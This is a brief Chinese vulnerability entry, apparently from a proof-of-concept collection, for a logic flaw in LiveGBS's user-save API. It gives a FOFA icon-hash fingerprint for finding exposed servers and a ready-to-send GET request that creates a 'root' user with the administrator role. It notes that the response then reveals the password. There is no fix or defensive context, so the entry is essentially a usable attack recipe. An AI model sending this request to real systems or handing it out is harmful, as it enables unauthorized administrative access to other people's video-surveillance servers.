# LiveGBSusersave存在逻辑缺陷漏洞

LiveGBSusersave ｜ 逻辑缺陷 ｜ —
- **指纹**：`FOFA：icon_hash="-206100324"`
- **请求**：`GET /api/v1/user/save?ID=&Username=root&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true HTTP/1.1`

**Payload**
```
响应体会出现密码
```